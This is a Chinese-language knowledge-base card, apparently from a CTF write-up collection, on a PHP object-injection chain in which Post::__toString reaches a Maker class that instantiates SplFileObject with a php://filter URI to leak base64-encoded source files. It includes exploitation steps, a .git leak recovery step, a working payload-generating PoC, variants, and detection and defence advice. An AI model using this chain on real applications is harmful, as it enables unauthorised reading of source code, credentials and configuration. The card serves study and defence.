---
id: web-php-deserialization-maker-splfileobject-php-filter-read
title: PHP 反序列化 Maker 链：__toString → getInstance 动态 new SplFileObject + php://filter 读源码
type: scenario
domain: web
path: web/php/deserialization
technique: php-magic-tostring-dynamic-instantiation-splfileobject-read
tags:
- php
- deserialization
- pop-chain
- splfileobject
- php-filter
- magic-method
- file-read
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:38:57+08:00'
  notes: 已对照原文核对：Post/Maker 类、__toString→getInstance、new $this->model(...$this->args)、SplFileObject+php://filter、.git/GitHack 前置均一致；PoC 与原文一致；未在 PHP 环境实跑。
url: /docs/web/php/deserialization/web-php-deserialization-maker-splfileobject-php-filter-read/
draft: false
kb_aliases:
- Serp
- Maker 反序列化
- Post __toString
- SplFileObject php://filter
- 动态类实例化读文件
- new $this->model
---

## 一句话结论

PHP 对象注入时，如果目标类在 `__toString` 中调用 `getInstance()`，而 `getInstance()` 用 `new $this->model(...$this->args)` 动态实例化攻击者可控的类名与参数，就可以把 `SplFileObject("php://filter/convert.base64-encode/resource=目标文件")` 作为“内容”对象塞进另一个会做字符串拼接的类；反序列化后一旦触发外层 `__toString`，内层 `Maker::__toString` 会调用 `getInstance()` 实例化 `SplFileObject` 并 `strval` 读取文件，响应回显 base64 源码。

## 原理

- **入口**：`Post::__toString()` 返回 `$this->title . "/" . $this->content`。当 `$content` 是对象时，PHP 会自动调用该对象的 `__toString()`，从而触发内层 gadget。
- **动态实例化**：`Maker::getInstance()` 在 `$this->obj == null` 时执行 `$this->obj = new $this->model(...$this->args)`；`$model` 与 `$args` 都是 public 属性，可被反序列化数据完全控制。这是“任意类 + 任意构造参数”的实例化原语。
- **`__toString` 触发**：`Maker::__toString()` 返回 `"object(".$this->model."){" . strval($this->getInstance()) . "}"`；`strval()` 对返回对象再次做字符串转换，确保 `getInstance()` 的返回值被读取。
- **文件读取 sink**：把 `$model` 设为 `SplFileObject`，`$args` 设为 `["php://filter/convert.base64-encode/resource=f1a9.php"]`。`SplFileObject` 构造时打开该流，`strval($splFileObject)` 读取内容；`php://filter` 的 `convert.base64-encode` 把源码编码成 base64，便于在 HTTP 响应中安全回显，避免 `<?php` 被浏览器/模板解析。
- **序列化载荷**：构造 `$posts = [Post(title="test", content=Maker("SplFileObject", ["php://filter/..."]) )]`，`serialize($posts)` 后作为不可信输入提交；`unserialize` 恢复对象图，输出/渲染 `$posts[0]` 时触发 `Post::__toString`。
- **为什么可读源码**：`SplFileObject` 支持 URL 包装器；`php://filter` 是 PHP 内置流过滤器，`convert.base64-encode` 不需要写权限；`resource=` 指向目标文件（如 `f1a9.php`），即可读取任意可读文件。
- **前置信息收集**：题目通过 `.git` 目录泄露（dirsearch 扫到 `.git/`）获取源码；用 GitHack 还原仓库后审计类定义，才能构造上述 POP 链。`.git` 泄露本身不是本卡核心，但没有源码就难以知道 `Maker` 的动态实例化原语。

## 触发条件

- 目标 PHP 应用存在 `unserialize()` 不可信输入（Cookie、POST 参数、缓存、反序列化字段等）。
- 代码中存在可用的 `__toString`/`__destruct`/`__wakeup` 链，且某个类会动态实例化攻击者可控的类名/参数（如 `new $this->model(...$this->args)`）。
- `SplFileObject` 未被禁用，`php://filter` 包装器可用；目标文件对 PHP 进程可读。
- 外层对象在反序列化后会被字符串化/输出（`echo`、字符串拼接、模板渲染等）。

## 利用步骤

1. 信息收集：扫描 `.git/` 等源码泄露；用 GitHack 还原源码，定位 `Post`/`Maker` 类及 `__toString`、`getInstance`、`__destruct`。
2. 确认触发点：找到反序列化入口（如 `unserialize(base64_decode($_COOKIE[...]))`）与之后会输出对象的代码（`echo $post`、`$post->content` 拼接等）。
3. 构造对象图：
   - 外层 `Post`：`title` 任意字符串，`content` 设为 `Maker` 对象。
   - 内层 `Maker`：`model = "SplFileObject"`，`args = ["php://filter/convert.base64-encode/resource=f1a9.php"]`。
4. `serialize($posts)` 生成 payload；如入口要求 URL 编码/Base64，按目标格式编码。
5. 提交 payload，触发 `Post::__toString` → `Maker::__toString` → `getInstance()` → `new SplFileObject(...)` → `strval` 读取文件。
6. 响应中取 base64 字符串，解码得到源码；重复读取其他文件（flag、config、其他类）以扩展利用链。
7. 若 `SplFileObject` 被禁用，尝试其他文件读取类/函数（如 `SplFileObject` 的替代、`php://filter` + `file_get_contents` 链、Phar 反序列化等）。

## PoC

```php
<?php
class Post {
    public $title;
    public $content;
    public function __construct($title, $content) {
        $this->title = $title;
        $this->content = $content;
    }
    public function __toString() {
        return $this->title . "/" . $this->content;
    }
}

class Maker {
    public $model = "Post";
    public $args = ["Title", "Contents"];
    protected $obj = null;
    public function __construct($model, $args) {
        $this->model = $model;
        $this->args = $args;
    }
    public function getInstance() {
        if ($this->obj == null) {
            $this->obj = new $this->model(...$this->args);
        }
        return $this->obj;
    }
    public function __toString() {
        return "object(" . $this->model . "){" . strval($this->getInstance()) . "}";
    }
    public function __destruct() {
        $this->obj = null;
    }
}

$p = [
    0 => "test",
    1 => new Maker("SplFileObject",
        ["php://filter/convert.base64-encode/resource=f1a9.php"])
];
$post = (new Maker("Post", $p))->getInstance();
$posts[] = $post;
$a = serialize($posts);
echo urlencode($a) . "\n";
// 本机验证：echo unserialize($a)[0]->content;
```

说明：payload 需按目标入口的编码方式（URL 编码/Base64）提交；`resource=` 换成目标文件。读取源码后可用 base64 解码查看。

## 变体与关联

- **触发方法变体**：`__toString` 可由 `echo`、字符串拼接、`strval`、模板输出、日志记录等触发；`__destruct`/`__wakeup` 也可作为入口，视目标代码而定。
- **动态实例化变体**：`new $this->model(...$this->args)`、`ReflectionClass::newInstanceArgs`、`call_user_func_array`、`$class::$method()` 等都可成为“可控类/方法”原语；见 [[web-php-reflectionclass-newinstanceargs-imagick-msl-webshell]]。
- **文件读取 sink 变体**：`SplFileObject`、`file_get_contents`、`fopen`、`readfile`、`include` 配合 `php://filter`、`php://filter/convert.base64-encode`；若允许 `phar://`，还可触发 PHAR 反序列化。
- **源码泄露入口**：`.git` 泄露、备份文件、`/.svn/`、`www.zip` 等；本卡的前提是拿到源码以发现 gadget。
- **关联**：[[web-php-deserialization-incomplete-class-roundtrip-bypass]]（`__PHP_Incomplete_Class` 往返差异读文件）、[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]（Phar 反序列化文件读取）、[[ctf-web-php-weak-compare-php-filter-data-wrapper]]（php://filter/data:// 读源码）。
- **边界**：若 `unserialize` 被禁用、对象输入被严格白名单校验、`SplFileObject`/`php://filter` 被 `disable_functions`/`open_basedir` 限制，链不成立；`__toString` 抛异常也会中断。

## 检测与防御

- **代码审计**：搜索 `unserialize(` 的不可信输入；检查 `__toString`/`__destruct`/`__wakeup` 中的动态实例化（`new $var`、`ReflectionClass`、`call_user_func`）与文件读取 sink（`SplFileObject`、`file_get_contents`、`php://filter`）。
- **防御**：不要对不可信数据使用 `unserialize`；改用 JSON/`allowed_classes` 白名单/签名；禁用不必要的 `SplFileObject`/`php://filter`（`disable_functions`、`open_basedir`）；`.git` 等 VCS 目录不应部署到 Web 根目录。
- **检测**：请求体/Cookie 中出现 `O:`/`a:` 序列化结构、`SplFileObject`、`php://filter`、`convert.base64-encode`；响应中出现大段 base64；`.git/` 扫描与 GitHack 访问日志。
- **响应**：轮换泄露的源码/密钥，修复反序列化入口与文件读取权限，清理暴露的 `.git`。
